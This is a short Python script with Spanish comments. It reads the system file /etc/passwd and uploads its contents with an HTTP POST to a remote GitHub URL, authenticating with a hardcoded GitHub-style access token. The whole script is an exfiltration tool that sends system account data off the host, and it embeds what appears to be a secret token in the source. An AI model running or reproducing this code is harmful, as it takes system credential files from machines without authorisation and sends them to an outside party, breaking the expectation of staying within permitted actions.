import os
import requests

def get_passwd():
  """Obtiene el archivo passwd."""
  with open("/etc/passwd", "r") as f:
    return f.read()

def send_passwd(passwd, token, url):
  """Envía el archivo passwd a una ubicación remota usando un token de autenticación de GitHub."""
  headers = {
    "Authorization": "token {}".format(token)
  }
  response = requests.post(url, headers=headers, data=passwd)

  if response.status_code == 200:
    print("El archivo passwd se cargó correctamente.")
  else:
    print("No se pudo cargar el archivo passwd.")

if __name__ == "__main__":
  passwd = get_passwd()
  token = "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" # Reemplace por su token real
  url = "https://github.com/msiriusv/passwd" # Reemplace por la URL real
  send_passwd(passwd, token, url)
